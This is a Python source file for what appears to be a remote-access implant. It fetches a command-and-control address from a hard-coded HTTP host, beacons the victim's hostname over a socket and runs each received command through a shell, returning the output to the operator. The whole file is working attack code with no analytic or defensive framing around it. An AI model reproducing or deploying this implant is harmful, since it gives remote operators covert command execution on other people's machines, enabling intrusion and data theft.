import socket
import subprocess
import requests

http_server = "192.168.1.16:8080"


def get_c2():
    global http_server

    response = requests.get("http://" + http_server + "/")
    c2_server = response.text
    return c2_server


def shell_live_exec(grain_op):
    try:
        command = subprocess.check_output(grain_op, stderr=subprocess.STDOUT, shell=True)
    except Exception as err:
        print("Error while running shell command: " + str(err))
        return "[!] Command Execution Error [!] " + str(err)
    else:
        return command


def script_execution(grain_op):
    return "Script Done"


def wind_rider(main_socket):
    global options

    hostname = socket.gethostname()
    auth_msg = "sand_grain;" + hostname
    main_socket.send(auth_msg.encode())
    grain_operation = main_socket.recv(2048)
    grain_operation = grain_operation.decode()

    if "Established" in grain_operation:
        grain_operation = main_socket.recv(2048)
        grain_operation = grain_operation.decode()

        while grain_operation != "Terminate":
            grain_operation = grain_operation.split("[#grain_op#]")
            if grain_operation[0] == "shell":
                return_operation_value = options[grain_operation[0]](grain_operation[1])
            elif grain_operation[0] == "script":
                return_operation_value = options[grain_operation[0]](grain_operation[1])

            print("[*] Sending return value...")
            main_socket.send(return_operation_value)
            print("[+] Sent")

            print("[*] Waiting for additional commands...")
            grain_operation = main_socket.recv(2048)
            grain_operation = grain_operation.decode()

        main_socket.close()

    try:
        main_socket.close()
    except Exception as s_err:
        print("[!] Error safe closing socket: " + str(s_err))
    else:
        print("[+] Socket Closed")


# --------- Global Variables ---------
options = {'shell': shell_live_exec, "script": script_execution}

# --------- Main ---------
try:
    c2_server = get_c2()
    c2_server = c2_server.split(":")
    master_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    master_socket.connect((c2_server[0], int(c2_server[1])))
except Exception as err:
    print("[+] Error while connecting to server: " + str(err))
else:
    wind_rider(master_socket)

